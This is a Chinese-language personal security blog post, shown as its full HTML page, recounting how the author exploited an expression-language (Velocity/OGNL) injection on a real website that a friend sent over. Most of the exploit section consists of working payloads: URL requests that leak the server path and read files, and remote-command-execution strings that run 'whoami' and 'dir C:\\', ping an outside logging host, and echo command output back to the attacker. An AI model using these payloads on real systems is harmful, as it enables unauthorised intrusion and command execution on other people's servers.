<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>VelocityServlet  Expression-language  Injection | b1ue</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">VelocityServlet  Expression-language  Injection</h1><a id="logo" href="/.">b1ue</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">VelocityServlet  Expression-language  Injection</h1><div class="post-meta">Nov 15, 2017</div><div class="post-content"><p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-11-15</p>
<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>朋友丢过来一个站点让帮忙看看。站点的架构为 Windows+Apache+JAVA。因没学过JAVA WEB。特记录下Exploit的过程,希望借此鼓励因对一门技术栈不熟悉就放弃目标的朋友。</p>
<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h4><p>拿到站点，首先要知道站点的架构。不难发现站点的架构为Windows+Apache+JAVA。通常,我还会爬一遍站点的url。探测是否存在敏感文件泄露以及敏感url,参数泄漏。扩大自己的攻击面。</p>
<p>经过简单探测,发现了一处疑似表达式注入的点,并且还出现了报错(可以泄漏很多有用的信息)。</p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107577343702.jpg" alt=""></p>
<p>但是由于我只写过JAVA,并没有任何JAVA WEB 经验。我连这个站点运用了什么框架都不清楚。于是开始漫长的踩坑之旅。在我以前的记忆中,我只知道两种类型的表达式注入(OGNL+EL)</p>
<p>首先我们测试下是否存在漏洞？ <code>${666*666}</code></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107592203135.jpg" alt=""></p>
<p>看到这里,就有很大的几率存在漏洞。但是对于我们还是判断不了它到底用了什么表达式语言。因为我没学过这块的技术栈，在这里就不去区分OGNL+EL的异同点,从而判断是哪种表达式。但是我知道OGNL+EL都有隐含对象。比如<em>${pageScope},${request}</em>等。但是很遗憾,什么也没有回显。</p>
<p>仔细查看报错信息,说不定会有收获。VelocityServlet: Error processing the template。一行加粗加大的提示赫然出现在我的眼前。Google=&gt;Velocity</p>
<p>发现一篇<a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="noopener">文章</a>  这篇文章提到这种表达式的注入<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107595249824.jpg" alt=""></p>
<p>尝试${class}<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107595914308.jpg" alt=""></p>
<p>于是这个站基本做到了认知的程度,下一步就是Fuzz了。</p>
<h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>根据这篇文章,尝试以下payload.</p>
<blockquote>
<p>$class.inspect(“java.lang.Runtime”).type.getRuntime().exec(“sleep 5”).waitFor()<br>尝试无果。然后把注意点转移在<em>action.ListResources</em>这个类上。</p>
</blockquote>
<p>因为对JAVA并不熟悉,再加上面向对象学的也不是很好。无法判断这个类是开发者自己写的,还是用的轮子。只能利用搜索引擎去探测一波。发现<a href="https://gist.github.com/gkhays/1d90f75d9347cc2d7bc70f7bd56f31e7" target="_blank" rel="noopener">链接</a></p>
<p>于是开始了手工Fuzz</p>
<p><code>/list.do?c=${class.getClassLoader()}</code><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107600989282.jpg" alt=""></p>
<p><code>/list.do?c=${class.getResource(&quot;&quot;).getPath()}</code></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107601608543.jpg" alt=""><br>暴露了网站的路径</p>
<p>做到这里,朋友说已经可以了。但是我还想继续判断下是否存在RCE</p>
<p>猜测getResource 这个方法是用来获取资源的，猜测是否存在SSRF,于是进行了大量手工FUZZ。根据回显来判断是否正确<br><code>/list.do?c=${class.getResource(&quot;/&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;.&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;file://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;gopher://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;http://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;../../../&quot;)}</code></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107604720015.jpg" alt=""></p>
<p><code>/list.do?c=${class.getResource(&quot;../../../../../index.htm&quot;).getContent()}</code><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107605658583.jpg" alt=""></p>
<p>出现了 java.io.BufferedInputStream@b4eccd。看样很有可能会产生任意读取漏洞。</p>
<p>还是不懂<a href="https://docs.oracle.com/javase/8/docs/api/java/io/BufferedInputStream.html#read-byte:A-int-int-" target="_blank" rel="noopener">BufferedInputStream</a> 只好借助参考链接</p>
<p>无奈 只发现了有价值的read()方法。借助可以方法可以从buff读取一个字符。由于我们找不到getWriter方法。所以我没有办法绕过去读取所有内容。下文有绕过方法。</p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107608666530.jpg" alt=""></p>
<p>chr(60) = ‘&lt;’</p>
<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>无奈只好去探测别的姿势。知识储备不够只好借助搜索引擎。翻到一篇<a href="http://www.vuln.cn/6934" target="_blank" rel="noopener">文章</a></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107609801923.jpg" alt=""></p>
<p>尝试<br><code>${&#39;A&#39;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)}</code><br>无果！ 难道就这么放弃？ 当然不是。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107612273604.jpg" alt=""></p>
<p>fuzz 出 ‘’.class.forName 这样引入对象是有效的。但是不知道为什么直接getRuntime不可以。<br>经过大量试错,最后 payload 为<br><code>list.do?c=${&#39;a&#39;.class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;cmd /c ping watito.exeye.io&quot;)}</code></p>
<h4 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h4><p>做到这里,朋友说可以了。但是,我觉得不是很好,因为到此还没做到命令回显，作为一个安全爱好者。漏洞利用就像一门艺术,如果不能做到命令回显那就感觉像是少了些什么。于是开始了新的踩坑之旅！<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108359183604.jpg" alt=""></p>
<p>执行payload。返回的是一个对象。我们要做的是将缓冲区的字节转换为字符。并且输出 出来。我查阅了大量的<a href="http://wooyun.jozxing.cc/search?keywords=%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&amp;content_search_by=by_bugs" target="_blank" rel="noopener">实战案例</a>,<br>表达式注入做到回显的基本都用到了 servlet 下的 getWriter().println()方法。所以我们的目标已经很明确了,那就是去寻找这个方法。</p>
<p><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null)}</em><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108363833087.jpg" alt=""></p>
<p>我们想要使用的是println方法,于是又进行大量的手工FUZZ。</p>
<p><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).println(“2333”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke(null.null).println(“”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke().println(“”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke(null,”23333”).println(“”)}</em></p>
<p>其实在这边查阅官方手册是快的,但是黑盒测试,对版本等信息都不了解。查阅了很多手册也没有什么收获。于是我去翻阅了java包的println函数的实现。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366776937.jpg" alt=""></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366895445.jpg" alt=""></p>
<p><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366979943.jpg" alt=""></p>
<p>原来println函数是import java.io.PrintWriter而来</p>
<p><em>/list.do?c=${&#x0023;c=”a”.class.forName(“java.io.PrintWriter”).getMethod(“println”,null)}</em><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108368528524.jpg" alt=""></p>
<p>很激动～ 但是不知道怎么调用。还是要不断试错！</p>
<p><em>/list.do?c=${&#x0023;c=”a”.class.forName(“java.io.PrintWriter”).getMethod(“println”,null).(“HELLO WORLD”)}</em></p>
<p>发现这样可以调用。</p>
<p>我们看一下猪猪侠构造的回显的payload</p>
<p>&amp;#x0023;=#</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">$&#123;&amp;#x0023;a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'/sbin/ifconfig','-a'&#125;)).start(),</span><br><span class="line">&amp;#x0023;b=&amp;#x0023;a.getInputStream(),</span><br><span class="line">&amp;#x0023;c=new **.**.**.**.InputStreamReader(&amp;#x0023;b),</span><br><span class="line">&amp;#x0023;d=new **.**.**.**.BufferedReader(&amp;#x0023;c),</span><br><span class="line">&amp;#x0023;e=new char[50000],&amp;#x0023;d.read(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;ringzero=&amp;#x0023;context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().println(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().flush(),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().close()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我们尝试来构造我们自己的payload。</p>
<p>&amp;#x0023;=#</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&amp;#x0023;e='a'.class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd /c whoami").getInputStream(),</span><br><span class="line">&amp;#x0023;o=new java.io.InputStreamReader(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;l=new java.io.BufferedReader(&amp;#x0023;o),&amp;#x0023;t=new char[50000],</span><br><span class="line">&amp;#x0023;l.read(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;print='a'.class.forName("java.io.PrintWriter").getMethod("println",null),</span><br><span class="line">&amp;#x0023;flush='a'.class.forName("java.io.PrintWriter").getMethod("flush",null),</span><br><span class="line">&amp;#x0023;close='a'.class.forName("java.io.PrintWriter").getMethod("close",null),</span><br><span class="line">&amp;#x0023;print.(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;flush='a'.class.forName("java.io.PrintWriter").getMethod("flush",null).(),</span><br><span class="line">&amp;#x0023;close='a'.class.forName("java.io.PrintWriter").getMethod("close",null).()&#125;</span><br></pre></td></tr></table></figure>
<p>居然没什么反应～</p>
<p>这个时候似乎陷入了胶着…因为用时太久,身心俱疲。随手测试了${&#x0023;request}<br>居然有回显。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108376127026.jpg" alt=""></p>
<p>可以确定是Ognl 表达式注入了.那么回显就要去朝着这个方向去思考。<br>看到 com.opensymphony.xwork.interceptor   版本比较低。</p>
<p>经过测试</p>
<p><em>{&#x0023;e=’a’.class.forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“cmd /c whoami”).getInputStream(),&#x0023;o=new java.io.InputStreamReader(&#x0023;e),&#x0023;l=new java.io.BufferedReader(&#x0023;o),&#x0023;k=&#x0023;l.readLine(),&#x0023;print=’a’.class.forName(“java.io.PrintWriter”).getMethod(“println”,null),&#x0023;print.(&#x0023;k)}</em></p>
<p>这样可以读取一行回显 这样就太鸡肋了～ 这个时候想到一个库还没使用那就是。com.opensymphony.xwork</p>
<p><em>${&#x0023;response=&#x0023;context.get(“com.opensymphony.xwork.dispatcher.HttpServletResponse”).getWriter(),&#x0023;response.println(“HelloWorld!”),&#x0023;response.flush(),&#x0023;response.close()}</em></p>
<p>于是最终payload为</p>
<p>&amp;#x0023;=#</p>
<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$&#123;&amp;#x0023;response=&amp;#x0023;context.get(<span class="string">"com.opensymphony.xwork.dispatcher.HttpServletResponse"</span>).getWriter(),</span><br><span class="line">&amp;#x0023;e=<span class="string">'a'</span>.<span class="keyword">class</span>.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null).exec(<span class="string">"cmd /c dir C:\\"</span>).getInputStream(),</span><br><span class="line">&amp;#x0023;o=new java.io.InputStreamReader(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;l=new java.io.BufferedReader(&amp;#x0023;o),&amp;#x0023;t=new char[<span class="number">90000</span>],</span><br><span class="line">&amp;#x0023;l.read(&amp;#x0023;t),&amp;#x0023;response.println(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;response.flush(),</span><br><span class="line">&amp;#x0023;response.close()&#125;</span><br></pre></td></tr></table></figure>
<p>使用这个姿势,同时可以解决上文的任意读取漏洞！有些朋友可能不理解为什么去费这么大气力去研究这个看似不是很重要的回显。完全可以通过DNS 带出来内容。但是技术的推动就是对技术毫不妥协嘛。本文不涉及任何框架的解读,想表达的含义是对一个你没接触的内容怎样去Exploit。对于这个场景来说,找一个可用的方法或者类有多么重要。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这篇writeup 用到的技术不是很高深,想必对JAVA WEB 很熟的人很快就能搞出来。但是我想在这篇文章里展示的是一种对于从来没接触过的技术栈 怎么去Exploit。看到这里你也很清楚了。善于利用搜索引擎。以及人工不断fuzz.逐渐去验证你的思路。慢慢缩小fuzz的范围以及payload。我花费了大量笔墨去阐述我走过的弯路,较小的笔墨去描述我成功执行的部分。看者自然有意。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107617955124.jpg" alt=""></p>
</div><div class="tags"></div><div class="post-nav"><a href="/2017/12/02/Neglected-Web-Security-thought/" class="pre">Neglected Web Security thought</a><a href="/2017/06/24/一个xss的利用-location-pathname-situation/" class="next">一个xss的利用(location.pathname situation)</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://magicbluech.github.io"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/06/22/SOME-INTERESTING-THINGS-IN-ELECTRON/">SOME INTERESTING THINGS IN ELECTRON(Essays)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/02/Neglected-Web-Security-thought/">Neglected Web Security thought</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/15/VelocityServlet-Expression-language-Injection/">VelocityServlet  Expression-language  Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/06/24/一个xss的利用-location-pathname-situation/">一个xss的利用(location.pathname situation)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/13/百度v3登陆系统架构问题导致点我链接拿到你的bduss-巧用referer/">百度v3登陆系统架构问题导致点我链接拿到你的bduss(巧用referer)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/06/SOME攻击可导致点我链接蠕虫-关注/">SOME攻击可导致点我链接蠕虫+关注</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2018 <a href="/." rel="nofollow">b1ue.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.1.20/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>